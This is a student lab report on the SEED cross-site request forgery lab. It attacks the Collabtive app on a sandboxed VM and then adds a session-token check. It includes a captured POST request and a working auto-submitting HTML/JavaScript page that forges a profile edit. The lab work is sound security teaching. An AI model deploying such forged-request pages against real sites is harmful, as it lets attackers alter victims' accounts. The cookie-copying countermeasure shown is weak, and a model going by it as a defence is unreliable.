#+TITLE: 2013-FA-CS-336-LA-04-AndyS-SheaN
#+AUTHOR: Andrew Schwartzmeyer, Shea Newton
#+OPTIONS: toc:nil num:nil

| Year and Semester: | 2013 FALL                         |
| Course Number:     | CS-336                            |
| Course Title:      | Intro. to Information Assurance   |
| Work Number:       | LA-04                             |
| Work Name:         | Cross-Site Request Forgery        |
| Work Version:      | Version 1                         |
| Long Date:         | Tuesday, 10 November 2013         |
| Author Names:      | Andrew Schwartzmeyer, Shea Newton |

* DONE LA-04 NetSec						 ::noexport::
   DEADLINE: <2013-11-10 Sun>
For this laboratory assignment please follow the instructions in the
laboratory in the link below and for preparing your laboratory report
please follow the instructions in this posting plus all the guidelines
posted within this course site under Course Info -> Coursework
Submission Instructions -> LA-Laboratory Report Submissions.

Cross-Site Request Forgery

Laboratory Instructions:

http://www.cis.syr.edu/~wedu/seed/Labs/Web/CSRF_Collabtive/

These laboratories have been developed by Wenliang Du of Syracuse
University and collaborators with sponsorship from the National
Science Foundation (NSF).

This is a group assignment (groups of 2 that will be determined in
class). Please submit a laboratory report as described within this
course site. Both students in the group will obtain the same grade and
only one student in the group needs to submit.

Additional Requirements:

0) When you create the VM it is mandatory that you configure the
   virtual Network to Internal Network.

VERY IMPORTANT: Before starting the laboratory please change the logon
credentials for both Ubuntu users and the mysql user.

1) In addition to describing with detail all the steps you carried out
   and their corresponding rationale and answering all the questions
   posted within the linked lab, please do the following:

2) Comment the code with high detail and include in your laboratory
   report those relevant portions of the code and their corresponding
   non-vulnerable versions.

3) Clearly specify, for example by highlighting, where the presented
   code is vulnerable.

4) Present a new version of the code that is not vulnerable, even when
   compiled and run with all compiler and system protection mechanisms
   disabled. Show, in the description and experimentally, that your
   improved version does not contain the same vulnerability.

5) Prepare and submit a laboratory report in PDF following the
   guidelines posted within this course site under Course Info ->
   Coursework Submission Instructions -> LA-Laboratory Report
   Submissions.


* Abstract

The purpose of this report is to detail the implications of cross-site
request forgery (CSRF) vulnerabilities. The CSRF attack detailed in
this lab allows a malicious site to inject an HTTP POST request into a
trusted site's active user session in order to impersonate the user
and forge their input. Beyond exploring the threat this vulnerability
represents, this report details a countermeasure, involving validating
a secret token, that may be used in order to secure a site against
this type of attack.

* Problem and Background
The purpose of this lab was to explore cross-site request forgery
attacks. Cross-site request forgeries(CSRF) are attacks that involve a
malicious site injecting an HTTP request into an active session with a
trusted site. 

CSRF attacks involve three players, a victim, a site the victim trusts
and a malicious site. The key to this type of attack is a victim
visiting the malicious site while logged into an active session with
their trusted site. The malicious site is able to forge the HTTP GET
and HTTP POST requests in order to impersonate or "compromise the
integrity" of the trusted site. [DU 3]

* Problem Detail

For this lab we were tasked with attacking the open-source web
application Collabtive via a cross-site request forgery, and then
implementing a secret-token based counter-measure to the attack.

The vulnerability exploited in this lab exists because Collabtive
fails to properly verify HTTP POST requests sent from its user edit
form (revealed by the "Edit" in the "My Account" page for a given
user). It trusts that any POST request from a logged-in user is valid,
based solely on the user having an authenticated session cookie.

Because of this, we can make an HTML page (the cross-site) which
generates a hidden form with our forged input, and sends it via a POST
request initiated through a JavaScript function call. If this site
were accidentally loaded by the user (say, through a malicious
advertisement), then our forged request would be sent to the server
and look just as if it was a valid request made by the user. If the
site was vulnerable to GET requests (that is, our attack avenue was
through any vulnerable tag that is not "form"), then we wouldn't even
need JavaScript, as GET request is much easier to make.

CSRF attacks are easily mitigated through better authentication
techniques. In this lab we explore the use of a secret-token, passed
with the form when a user generates a valid POST request, but
unobtainable (save for a man-in-the-middle attack, but if that is
available, there are worse ways to cause harm) by the
attacker. Without the secret token, the forged request will be
recognized as unauthenticated and the attack will fail.

* Tasks
** Task 0: Setup the VM

Our first task is to properly setup the provided virtual machine
environment in which we will complete this lab. We are given an Ubuntu
Desktop 11.04 VM, and the first order of business is to lock it
down. To do this we set its virtual network adaptor to "Internal
Network" so that it cannot communicate with any other machine, then we
change the credentials of both Ubuntu users and the MySQL user
(although the latter is not used in this lab).

** Task 1: Modifying the Victim's Profile

Before we can modify the victim's profile, we need to capture a POST
request of the user submitting the edit profile form (as it is this
request we will be forging). To do this, we opened up Collabtive,
logged in as "bob", navigated to the edit profile form, opened the
Live HTTP Headers extension, cleared it, submitted the form, and went
back to the extension, which captured the initial POST request for us
(in addition to all the subsequent GET requests made by the browser
drawing the new page). The captured POST request is reproduced here,
with the GET requests removed for brevity.

#+begin_src txt
http://localhost/CSRF/Collabtive/manageuser.php?action=edit

POST /CSRF/Collabtive/manageuser.php?action=edit HTTP/1.1 Host:
localhost User-Agent: Mozilla/5.0 (X11; Linux i686; rv:5.0)
Gecko/20100101 Firefox/5.0 Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5 Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7 Connection: keep-alive
Referer:
http://localhost/CSRF/Collabtive/manageuser.php?action=editform&id=3
Cookie: PHPSESSID=88n5386bqoes4rs843oviuh731 Content-Type:
multipart/form-data;
boundary=---------------------------20367708811588547619618939618
Content-Length: 2265
-----------------------------20367708811588547619618939618
Content-Disposition: form-data; name="name"

bob -----------------------------20367708811588547619618939618
Content-Disposition: form-data; name="userfile"; filename=""
Content-Type: application/octet-stream


-----------------------------20367708811588547619618939618
Content-Disposition: form-data; name="file-$myprojects[project].ID"


-----------------------------20367708811588547619618939618
Content-Disposition: form-data; name="company"


-----------------------------20367708811588547619618939618
Content-Disposition: form-data; name="email"

bob@example.com
-----------------------------20367708811588547619618939618
Content-Disposition: form-data; name="web"


-----------------------------20367708811588547619618939618
Content-Disposition: form-data; name="tel1"


-----------------------------20367708811588547619618939618
Content-Disposition: form-data; name="tel2"


-----------------------------20367708811588547619618939618
Content-Disposition: form-data; name="address1"


-----------------------------20367708811588547619618939618
Content-Disposition: form-data; name="zip"


-----------------------------20367708811588547619618939618
Content-Disposition: form-data; name="address2"


-----------------------------20367708811588547619618939618
Content-Disposition: form-data; name="country"


-----------------------------20367708811588547619618939618
Content-Disposition: form-data; name="state"


-----------------------------20367708811588547619618939618
Content-Disposition: form-data; name="gender"


-----------------------------20367708811588547619618939618
Content-Disposition: form-data; name="locale"

en -----------------------------20367708811588547619618939618
Content-Disposition: form-data; name="admin"


-----------------------------20367708811588547619618939618
Content-Disposition: form-data; name="oldpass"


-----------------------------20367708811588547619618939618
Content-Disposition: form-data; name="newpass"


-----------------------------20367708811588547619618939618
Content-Disposition: form-data; name="repeatpass"


-----------------------------20367708811588547619618939618--

HTTP/1.1 302 Found Date: Sun, 10 Nov 2013 02:02:32 GMT Server:
Apache/2.2.17 (Ubuntu) X-Powered-By: PHP/5.3.5-1ubuntu7.2 Expires:
Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache,
must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Location:
http://localhost/CSRF/Collabtive/manageuser.php?action=profile&id=3&mode=edited
Content-Encoding: gzip Vary: Accept-Encoding Content-Length: 26
Keep-Alive: timeout=15, max=100 Connection: Keep-Alive Content-Type:
text/html; charset=utf-8
----------------------------------------------------------
#+end_src

With the captured request, we now have the information (namely the
requests' structure) required for us to forge a new one. Next we need
to make an HTML page for our attack, with a hidden form filled with
our desired changes, and some embedded JavaScript to submit it through
a POST request.

#+begin_src html
  <!DOCTYPE html>
  <!--
  This code was provided by the lab's author Wenliang Du, of Syracuse
  University under the GNU Free Documentation License
  
  Editted by us to make our desired changes, and post to the correct
  URL.
  -->
  <html>
  <title>
  </title>
  <body>
  <h1>
  This page forges an HTTP POST request.
  </h1>
  <script type="text/javascript">
  function post(url,fields) {
     //create a <form> element.
     var p = document.createElement('form');
     //construct the form
     p.action = url;
     p.innerHTML = fields;
     p.target = 'self';
     p.method = 'post';
     //append the form to the current page.
     document.body.appendChild(p);
     //submit the form
     p.submit();
  }
  
  function csrf_hack() {
  var fields;
     // The following are form entries that need to be filled out
     //     by attackers. The entries are made hidden, so the victim
     //     won't be able to see them.
     fields += "<input type='hidden' name='name' value='notbob' />";
     fields += "<input type='hidden' name='gender' value='female' />";
     fields += "<input type='hidden' name='company' value='seed' />";
     post('http://localhost/CSRF/Collabtive/manageuser.php?action=edit',fields);
  }
  // invoke csrf_hack() after the page is loaded.
  window.onload = function() { csrf_hack(); }
  </script>
  </body>
  </html>
#+end_src

Now if we login to a user (we chose 'bob'), and then in a separate
browser tab open the attack code at
"http://localhost/CSRF/Attack/index.html", our cross-site request
forgery will change bob's name to 'notbob', transgender him, and
assign him to our company 'seed'. This is done when the csrf_hack()
JavaScript function is called (on page load through the
'window.onload' hook), which adds our three HTML form inputs to a
fields variable, and submits this and the attack URL
("http://localhost/CSRF/Collabtive/manageuser.php?action=edit") to the
function post(), which creates an HTML form element on the document
and puts it into a temporary variable, assigns the url to the action
of the element, puts the value of fields into the element's inner
HTML, assigns the element as target, makes the element's method a POST
request, appends the element as a child to the body of the HTML
document, and calls submit on the element. This final action causes
the actual POST request with the hidden HTML form to be submitted to
the target URL, which in turn edit's the users profile because the
destination server cannot distinguish the forged request because it
trusts (through the browser's cookie) the user's authentication.

** Task 2: Implementing a countermeasure for Collabtive

Because cross-site request forgeries depend on the server blindly
re-authenticating the user through their cookie (which is obviously
quite vulnerable), protecting a web application from an CSRF attack is
actually quite easy. It simply requires implementation better
authentication. The method the lab instructs us to use is that of
secret-token authentication: our edit user form can include a hidden
field with a secret ID (normally the value of the session cookie),
which the server can use to validate an incoming POST request. If the
request does not have the SID, or it does not match, the server can
reject the request and thus deny the attack. [Du 4]

To implement this, first we add the following code into edit user form
template file located at
"/var/www/CSRF/Collabtive/templates/standard/edituserform.tpl".

#+begin_src html
  <!-- Unmodified code removed for brevity -->
...
  <input type = "hidden" name = "sid" value = "" />
...
  <button type="submit" onclick="this.form.sid.value = document.cookie"
    onfocus="this.blur()">{#send#}</button>
...
#+end_src

This adds the hidden input 'sid', and, on the click of the form send
button, assigns the value of the session cookie to the value of the
sid input.

Next we need to implement the SID validation. In the file
"/var/www/CSRF /Collabtive/manageuser.php", we add the following
validation check inside the first logical if statement (which checks
that our action is not one of "login", "logout", "resetpassword", or
"loginerror", so it will pass for "edit").

#+begin_src php
  if ($action == "edit" &&
      $_COOKIE["PHPSESSID"] !=
        str_replace("PHPSESSID=", "", getArrayVal($_POST, "sid"))) { 
    echo("Cookie and SID unmatched");
    die();
  }
#+end_src

This checks if our action is an edit, and if so, it validates that the
value of the cookie `$_COOKIE["PHPSESSID"]` against the value of the
"sid" from the POST request (which has been parsed by str_replace to
get rid of the extraneous string "PHPSESSID="). If they do not match,
it echoes such and subsequently dies, denying the attack. Note also
that this approach does not require a JavaScript string operation,
only the PHP str_replace() function.

With the countermeasure implemented, we attempt to re-execute our
prior attack. This fails as expected, with the message "Cookie and SID
unmatched". We can get around this by capturing a POST session of the
user containing either the SID or cookie value, and then replicating
this in our forged request. However, this would require a live
man-the-middle attack to gain the necessary data. Without this
information, we cannot get around this defense.

* Code

Detailed in Tasks Section

* Answers

Detailed in Tasks Section

* References

Du, Wenliang. 2006-2011. "Cross-Site Request Forgery (CSRF) Attack Lab". http://www.cis.syr.edu/~wedu/seed/Labs/Web/CSRF_Collabtive/
